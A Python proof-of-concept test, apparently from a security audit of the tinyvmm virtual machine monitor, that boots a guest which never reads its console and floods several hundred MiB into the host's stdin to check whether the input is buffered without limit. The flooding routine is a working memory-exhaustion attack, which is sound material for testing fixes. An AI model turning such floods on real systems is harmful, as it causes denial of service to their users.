"""PoC, finding 10 (console): host input for a guest that isn't reading it is
held without bound.

tinyvmm forwards its stdin to the guest's hvc0. The guest here never reads
its console; the PoC pipes several hundred MiB into tinyvmm's stdin. A
vulnerable build queues all of it (its commit grows by as much, and by GiBs
if the input keeps coming); a fixed build holds at most 16 MiB and drops the
rest.
"""
import subprocess
import time
from pathlib import Path

from .common import REPO, build_initramfs, commit_bytes, run_capped

INIT = rb"""#!/bin/busybox sh
bb=/bin/busybox
$bb mount -t proc proc /proc
$bb mount -t devtmpfs dev /dev
exec < /dev/null
echo "[poc] guest up, not reading its console" > /dev/kmsg
$bb sleep 45
echo "[poc] guest done" > /dev/kmsg
$bb poweroff -f
exec $bb cat
"""
FEED = 512 << 20


def run(exe: Path, work: Path) -> dict:
    work.mkdir(parents=True, exist_ok=True)
    initrd = build_initramfs(work / "mute.cpio.gz", INIT)
    fed = [0]
    idle = [0]

    def feed(proc):
        chunk = b"A" * (1 << 20)
        # Let the guest boot (its RAM is committed by then) before measuring.
        time.sleep(6)
        idle[0] = commit_bytes(proc._handle)[0]
        try:
            while fed[0] < FEED and proc.poll() is None:
                proc.stdin.write(chunk)
                fed[0] += len(chunk)
            proc.stdin.flush()
        except OSError:
            pass

    r = run_capped([exe, "--pvh-run", "--ram-mb", "256", "--watchdog-secs", "70", "--initrd", initrd,
                    REPO / "vmlinux", "--", "console=hvc0", "pci=conf1,nocrs,lastbus=0"],
                   timeout=150, memory_limit=6 << 30, stdin=subprocess.PIPE, feed=feed)
    growth = r.peak_commit - idle[0]
    vulnerable = growth > (64 << 20)
    return {"vulnerable": vulnerable,
            "evidence": f"fed {fed[0] >> 20} MiB of input; commit grew by {growth / (1 << 20):.0f} MiB "
                        f"(from {idle[0] >> 20} to a peak of {r.peak_commit >> 20} MiB); exit code {r.rc}"}
